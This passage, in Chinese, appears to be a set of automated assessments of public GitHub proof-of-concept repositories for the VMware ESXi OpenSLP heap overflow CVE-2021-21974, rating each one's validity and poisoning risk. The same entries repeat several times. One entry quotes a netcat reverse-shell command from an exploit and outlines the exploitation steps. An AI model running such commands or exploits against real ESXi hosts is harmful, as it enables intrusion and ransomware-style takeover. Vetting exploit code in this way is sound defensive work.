3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
